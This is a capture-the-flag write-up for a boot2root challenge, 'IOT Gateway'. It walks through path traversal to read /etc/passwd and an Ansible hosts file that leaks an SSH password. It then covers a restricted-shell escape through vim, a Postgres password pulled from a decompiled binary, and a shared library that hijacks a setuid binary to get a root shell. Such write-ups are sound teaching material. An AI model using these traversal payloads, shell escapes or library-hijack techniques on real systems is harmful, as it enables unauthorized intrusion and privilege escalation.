# IOT Gateway - Boot2Root 

## About the challenge

This challenge is from the DDC Nationals 2026. I did not solve this challenge during the event, however I got really far and had a good idea on what the solution was. I made this write-up a couple days after the competition.


## Overview of Sections

1. Discovering path traversal
2. Finding ssh credentials
3. Escaping the restricted shell (rbash)
4. Searching for privilege escalation possibilities
5. Reverse engineering db_check
6. Exploiting setuid binary to become root


## 1. Discovering path traversal

We have been given a website to look at `http://gateway.fire`. There is not much, but you can export a system log at this endpoint `http://gateway.cfire/export?file=system.log`. Maybe we can access other files?

I tried accessing `http://gateway.cfire/export?file=../../../../etc/passwd` which gave the following output:
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
postgres:x:106:108:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
maintenance:x:1000:1000::/home/maintenance:/bin/rbash
```

**Path traversal confirmed!**

I tried looking at *maintenance*'s home directory, but there did not seem to be anything. 

I was stuck here for a while, but then a hint was released:

`Et hint: mappen /etc/ansible er spændende`
Translation: `A hint: The directory /etc/ansible is exciting`

I immediately googled what standard configuration files are in ansible. I found a file at /etc/ansible/hosts. 

## 2. Finding ssh credentials

`http://gateway.cfire/export?file=../../../../../etc/ansible/hosts`

**Ansible hosts file:**

```
[gateway]
127.0.0.1 ansible_connection=ssh ansible_user=maintenance ansible_ssh_pass=SuperSecureMaintenance123!
```

We have ssh credentials for the user maintenance!

## 3. Escaping the restricted shell (rbash)

After logging in using ssh, we only have an extremely restricted shell with two commands: ls and view. 

```bash
maintenance@c40958e1d385:~$ ls -la bin
total 8
drwxr-xr-x 2 maintenance maintenance 4096 May  6 15:26 .
drwxr-x--- 1 maintenance maintenance 4096 May 12 17:00 ..
lrwxrwxrwx 1 maintenance maintenance    7 May  6 15:26 ls -> /bin/ls
lrwxrwxrwx 1 maintenance maintenance   12 May  6 15:26 view -> /usr/bin/vim

```
ls is a symlink to /bin/ls, which is not surprising, but **view** is a symlink to /usr/bin/vim. I googled "vim privilege escalation" and found this article: `https://hoop.dev/blog/privilege-escalation-in-vim-a-simple-path-to-root`

I tried using these commands in view (vim) and BOOM! Normal bash obtained

In view (vim):
```bash
:set shell=/bin/bash
:shell
```

Great, so far so good. Now we just need to become root.

## 4. Searching for privilege escalation possibilities

I started out by looking for setuid binaries and checking GTFObins, but this did not give me anything. I spent a lot of time getting the dirtyfrag exploit (exploit for getting root on almost every linux version which was unpatched at the time of this writeup. See more here: `https://github.com/V4bel/dirtyfrag`).

I got the exploit script on the machine, but after about an hour of trying to make it work I gave up on that idea and focused on the intended solution instead. 

I found a setuid binary called `system-health-check`, which looked interesting. When running it, we can see that it tries to run a file called `libcheck.so` which does not exist. Perfect for privilege escalation. But we need to be postgres before we can create `libcheck.so`. So the path is: maintenance -> postgres -> root

This is how far I made it before I had to leave the competition :( The rest of the writeup is from after the competition

--- 

## 5. Reverse engineering db_check

I found another binary that looked interesting in /opt/gateway. It was a binary called db_check, and since I was looking for credentials, I thought it might be a good idea to look more into it. 

I used `https://dogbolt.org/` as a decompiler, and sure enough there was a hardcoded password:

```c
int64_t check_db()
{
    void* fsbase;
    int64_t rax = *(fsbase + 0x28);
    char var_138;
    __builtin_strncpy(&var_138, "DBAdmin_p0stgr3s_Secr3t", 0x18);
    char s[0x108];
    snprintf(&s, 0x100, "host=127.0.0.1 user=admin password=%s dbname=template1 sslmode=disable", 
        &var_138);
    int64_t rax_2 = PQconnectdb(&s);
    
    if (!PQstatus(rax_2))
        PQclear(PQexec(rax_2, "SELECT 1;", "SELECT 1;"));
    
    PQfinish(rax_2);
    
    if (rax == *(fsbase + 0x28))
        return rax - *(fsbase + 0x28);
    
    __stack_chk_fail();
    /* no return */
}
```


I then used the args from the binary on psql and hoped that it would work:

```bash
maintenance@c40958e1d385:/opt/gateway$ psql -h 127.0.0.1 -U admin -W "DBAdmin_p0stgr3s_Secr3t" -d template1 
psql: warning: extra command-line argument "DBAdmin_p0stgr3s_Secr3t" ignored
Password: 
psql (14.22 (Ubuntu 14.22-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

template1=> \d
              List of relations
 Schema |     Name     |   Type   |  Owner   
--------+--------------+----------+----------
 public | users        | table    | postgres
 public | users_id_seq | sequence | postgres
(2 rows)

template1=> SELECT * from users;
 id | username |  system_password  
----+----------+-------------------
  1 | postgres | Psql_S3rv1c3_P@ss
(1 row)
```

**And it worked!!**

## 6. Exploiting setuid binary to become root

Now I just needed to get root. I am not proficient with c, so I read some articles online for making a simple script. Here is the pages i read and the script at the bottom:

`https://stackoverflow.com/questions/19209141/how-do-i-execute-a-shell-built-in-command-with-a-c-function`
`https://stackoverflow.com/questions/14884126/build-so-file-from-c-file-using-gcc-command-line`

```c
#include <stdio.h>
#include <unistd.h>
#include <dirent.h>


void run_check() {
    return execl ("/bin/bash", "cat /root/flag.txt > /tmp/flag.txt", NULL);
}


int main (void) {
    run_check();
    return 0;

}
```

> The script did not put the flag in /tmp/flag.txt, but I got a root shell instead. This happened because execl only executed the first argument which was /bin/bash, and at the time I completed the challenge I was just too tired to look more into what happened.  


```bash
root@c40958e1d385:/# cd root
root@c40958e1d385:/root# ls
flag.txt
root@c40958e1d385:/root# cat flag.txt
DDC{Industrial_Control_System_1324556}
```

I really liked this challenge, and while I unfortunately did not get it during the competition, I think it was really fun to upsolve it at home without AI!